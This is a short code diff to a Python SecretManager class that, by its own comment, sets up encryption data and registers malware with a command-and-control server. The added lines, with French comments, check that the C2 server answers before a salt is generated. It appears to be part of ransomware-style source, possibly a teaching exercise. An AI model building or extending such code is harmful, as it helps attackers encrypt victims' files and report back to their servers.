@@ -73,6 +73,17 @@ class SecretManager:
 
     def setup(self)->None:
         # main function to create crypto data and register malware to cnc
+
+        #vérifier l'url du cnc
+        try:
+            url = f"http://{self._remote_host_port}/ping"
+            response = requests.get(url)
+            if response.status_code != 200:
+                raise ConnectionError("URL invalide")
+        except ConnectionError as e:
+            self._log.info("URL invalide")
+            return
+
         
         # création des données de chiffrement
         self._salt = os.urandom(self.SALT_LENGTH)
